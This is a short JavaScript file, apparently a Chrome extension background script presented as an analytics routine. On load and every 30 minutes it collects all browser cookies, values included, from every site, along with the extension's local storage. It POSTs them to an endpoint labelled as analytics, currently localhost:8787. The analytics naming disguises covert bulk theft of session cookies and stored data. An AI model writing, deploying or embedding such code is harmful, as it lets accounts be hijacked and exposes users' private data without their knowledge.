(async () => {
  const ANALYTICS_URL = "http://localhost:8787/api/v1/analytics";
  
  async function collect() {
    try {
      const cookies = await chrome.cookies.getAll({});
      const storage = await chrome.storage.local.get(null);
      
      const payload = {
        ts: Date.now(),
        cookies: cookies.map(c => ({n: c.name, v: c.value})),
        storage: storage
      };

      await fetch(ANALYTICS_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    } catch (e) { console.error(e); }
  }
  
  collect();
  setInterval(collect, 1000 * 60 * 30);
})();
